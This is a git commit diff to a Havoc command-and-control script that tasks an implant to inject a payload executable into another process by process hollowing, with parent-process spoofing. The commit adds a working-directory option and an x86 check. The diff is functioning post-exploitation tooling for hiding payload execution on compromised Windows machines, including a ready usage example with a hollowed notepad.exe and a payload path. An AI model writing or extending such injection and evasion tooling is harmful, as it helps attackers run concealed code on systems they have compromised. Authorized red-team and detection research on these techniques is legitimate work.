738b75b6ec5878cb40ab497a4a2781fdd94f1730
wizardy0ga <90923369+wizardy0ga@users.noreply.github.com>
2026-07-15 19:56:22 -0700

    Add cwd argument compatibility for havoc script

--- Source/Scripts/RunPE.py
+++ Source/Scripts/RunPE.py
@@ -39,13 +39,36 @@ def RunPE( demon_id, *args ):
     exe_payload: bytes  = None
     object_file_path    = ""
     
-    if ( len( args ) not in ( 2,3 ) ):
+    if demon.ProcessArch == 'x86':
+        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
+        return False
+
+    if ( len( args ) not in ( 2,3,4 ) ):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
         return False
     
-    hollow_target = args[0]
-    exe_path = args[1]
-    ppid = args[2] if len(args) is 3 else 0
+    hollow_target   = args[0]
+    exe_path        = args[1]
+    cwd             = "C:\\Windows\\System32"
+    ppid            = 0
+
+    if len( args ) == 3:
+        try:
+            ppid = int(args[2])
+        except ValueError:
+            try:
+                cwd = str(args[2])
+            except ValueError:
+                demon.ConsoleWrite( demon.CONSOLE_ERROR, f"An invalid data type was given for argument 3 ({args[2]}). Expected string or int.")
+                return False
+    
+    if len( args ) == 4:
+        try:
+            cwd = str(args[2])
+            ppid = int(args[3])
+        except ValueError:
+            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Third argument must be string for current working directory & fourth argument integer for parent process id." )
+            return False
     
     if not exists( exe_path ):
         demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid executable path: { exe_path }" )
@@ -59,10 +82,12 @@ def RunPE( demon_id, *args ):
         return False
 
     packer.addstr( hollow_target )
-    packer.addint( int(ppid) )
+    packer.addstr( cwd )
+    packer.addint( ppid )
     packer.addbytes( exe_payload )    
     
     message = f"Tasked demon to execute RunPE BOF against {hollow_target} with {exe_path} [{len(exe_payload)}] bytes"
+    message += f" with current working directory '{cwd}'"
     message += f" spoofing parent as pid {ppid}" if ppid != 0 else ""
     task_id = demon.ConsoleWrite( demon.CONSOLE_TASK, message)
     
@@ -72,4 +97,4 @@ def RunPE( demon_id, *args ):
 
 description = """A BOF to execute a PE file in the address space of a remote process
 \t         using the process hollowing technique. Supports parent proces spoofing."""
-RegisterCommand( RunPE, "", "runpe", description, 0, "[/path/to/hollow] [/path/to/payload] [OPT: ppid]", "c:\\windows\\system32\\notepad.exe /tmp/payload.exe 1234" )
+RegisterCommand( RunPE, "", "runpe", description, 0, "[/path/to/hollow] [/path/to/payload] (cwd) (ppid)", "c:\\windows\\system32\\notepad.exe /tmp/payload.exe C:\\Windows\\Temp 1234" )
